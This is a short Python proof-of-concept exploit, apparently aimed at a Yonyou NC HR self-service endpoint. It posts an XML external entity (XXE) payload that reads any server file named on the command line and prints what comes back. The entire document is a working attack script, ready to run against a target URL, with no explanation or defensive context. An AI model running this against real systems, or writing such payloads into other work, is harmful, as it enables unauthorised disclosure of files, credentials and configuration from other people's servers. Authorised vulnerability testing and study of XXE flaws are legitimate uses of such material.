import requests
import urllib3
urllib3.disable_warnings()
import sys

proxies = {
    # "http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"
}

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0)",
    "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
}

def poc(url, file):
    body=f'__type=loadData&__viewInstanceId=nc.bs.hrss.ref.view.RefGrid~nc.bs.hrss.ref.view.RefGridViewModel^3&__xml=<!DOCTYPE ANY [<!ENTITY xxe SYSTEM "{file}">]> <rpc id="dsDefdoc" type="wrapper" objectclazz="undefined" pi="1" ps="20" pc="3" prc="58" fs="PK,CODE,NAME"><ps><p name="pkDefdocList">HI000000000000000003</p><p name="docCode">q</p></ps><vps><p name="refcode">%26xxe;</p></vps></rpc>&1693555936050'
    rsp = requests.post(url, data=body, headers=headers)
    print()
    print(rsp.text)

if __name__ == '__main__':
    poc(sys.argv[1], sys.argv[2])
